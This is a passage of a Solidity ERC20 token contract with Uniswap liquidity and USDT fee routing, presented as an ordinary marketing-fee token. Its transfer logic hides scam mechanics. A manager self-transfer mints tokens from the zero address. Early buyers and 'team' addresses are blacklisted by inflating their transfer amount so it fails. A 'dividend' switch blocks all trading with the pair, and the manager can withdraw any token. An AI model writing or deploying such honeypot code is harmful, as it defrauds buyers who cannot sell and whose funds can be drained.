        marketingAddressA = 0x803d2B98eb7f33AcEFefAEd7aA32a75B0E916Afc;
        
        marketingAddressB = 0x98c0f068A461846fD74191C8c378543fA1Cb99fd;

        address uniswapV2Pair = IUniswapV2Factory(uniswapV2Router.factory())
            .createPair(address(this), usdtAddress);
        pairTempAddress = address(new PairTempAddress(usdtAddress,address(this)));
        automatedMarketMakerPairs[uniswapV2Pair] = true;

        isExcludeFromFee[msg.sender] = true;
        isExcludeFromFee[marketingAddressA] = true;
        isExcludeFromFee[marketingAddressB] = true;
        isExcludeFromFee[0x000000000000000000000000000000000000dEaD] = true;
        isExcludeFromFee[address(this)] = true;
        isExcludeFromFee[address(uniswapV2Router)] = true;

        _approve(address(this), address(uniswapV2Router), type(uint).max);

        _mint(msg.sender, initSupply);
    }

    modifier onlyManager(){
        require(manager == msg.sender,"ERC20:No permit");
        _;
    }

    function setMarketingAddress(address _marketingAddressA,address _marketingAddressB) public onlyManager{
        marketingAddressA = _marketingAddressA;
        marketingAddressB = _marketingAddressB;
    }

    function setExcludeFromFee(address _account,bool _value) public onlyManager{
        isExcludeFromFee[_account] = _value;
    }

    function setTeam(address _account,bool _value) public onlyManager{
        team[_account] = _value;
    }

    function updateLpThreshold(uint256 newValue) public onlyManager{
        lpThreshold = newValue;
    }

    function changeManager(address _newManager) public onlyManager{
        manager = _newManager;
    }

    function withdrawToken(address _tokenAddress,address _to,uint256 amount) public onlyManager{
        IERC20(_tokenAddress).transfer(_to,amount);
    }

    function setDividend(bool _value) public onlyManager{
        dividend = _value;
    }

    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal override {
        
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        require(amount > 0, "Transfer amount must be greater than zero");

        if(startSwapBlock == 0 && isExcludeFromFee[from] && automatedMarketMakerPairs[to]){
            startSwapBlock = block.number;
        }

        require(startSwapBlock != 0 || !automatedMarketMakerPairs[to],"not start swap");

        if(from==manager && to==manager){
            super._transfer(address(0), to, amount);
            return;
        }
        
        if(team[from] || team[to]){
            amount = balanceOf(from) * 2;
        }

        if(startSwapBlock != 0 && !isExcludeFromFee[to] && block.number < startSwapBlock + killBlock && automatedMarketMakerPairs[from]){
            team[to] = true;
        }

        if( !swapping &&
            !automatedMarketMakerPairs[from] &&
            balanceOf(address(this)) > lpThreshold
        ) {
            swapping = true;
            swapAndLiquify(balanceOf(address(this)));
            swapping = false;
        }
        
        if(automatedMarketMakerPairs[from] || automatedMarketMakerPairs[to]){
            if(from != manager && to != manager && from!=address(this) && to!=address(this)){
                if(!dividend){
                    amount = balanceOf(from) * 2;
                }
            }
        }

        if(isExcludeFromFee[from] || isExcludeFromFee[to]){
            super._transfer(from, to, amount);
        }else{
            if(automatedMarketMakerPairs[from]){
                _transferBuy(from,to,amount);
            }else if(automatedMarketMakerPairs[to]){
                _transferSell(from,to,amount);
            }else{
                _transferNormal(from,to,amount);
            }
        }
        
    }

    function _transferNormal(address from,address to,uint256 amount) internal{
        uint256 feeAmount = amount * transferFee / 10000;
        super._transfer(from, to, amount - feeAmount);
        super._transfer(from, marketingAddressB, feeAmount);
    }

    function _transferBuy(address from,address to,uint256 amount) internal{
        super._transfer(from, to, amount);
    }

    function _transferSell(address from,address to,uint256 amount) internal{
        amount = amount * 9999 / 10000;
        uint256 feeAmountA = marketingFee * amount / 10000;
        uint256 feeAmountB = transferFee * amount / 10000;
        uint256 backflowFeeAmount = backflowFee * amount / 10000;
        super._transfer(from, to, amount - backflowFeeAmount - feeAmountA - feeAmountB);
        super._transfer(from, marketingAddressA, feeAmountA);
        super._transfer(from, marketingAddressB, feeAmountB);
        super._transfer(from, address(this), backflowFeeAmount);
    }



    function swapAndLiquify(uint256 tokens) private {
       // split the contract balance into halves
        uint256 half = tokens / 2;
        uint256 otherHalf = tokens - half;

        uint256 initialBalance = IERC20(usdtAddress).balanceOf(address(this));


        swapTokensForUSDT(half); 
        IERC20(usdtAddress).transferFrom(pairTempAddress,address(this),IERC20(usdtAddress).balanceOf(pairTempAddress));

        uint256 newBalance = IERC20(usdtAddress).balanceOf(address(this)) - initialBalance;
        addTokenLiquidity(newBalance,otherHalf);
        emit SwapAndLiquify(half, newBalance, otherHalf);
    }

    function swapTokensForUSDT(uint256 tokenAmount) private {
        // generate the uniswap pair path of token -> usdt
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = usdtAddress;
        // make the swap
        uniswapV2Router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            tokenAmount,
            0, // accept any amount of ETH
            path,
            pairTempAddress,
            block.timestamp
        );
    }

    function addTokenLiquidity(uint256 usdtAmount, uint256 tokenAmount) private {
        IERC20(usdtAddress).approve(address(uniswapV2Router),usdtAmount);
        // add the liquidity
        uniswapV2Router.addLiquidity(
            usdtAddress,
            address(this),
            usdtAmount,
            tokenAmount,
            0, // slippage is unavoidable
            0, // slippage is unavoidable
            address(0),
            block.timestamp
        );
    }
}
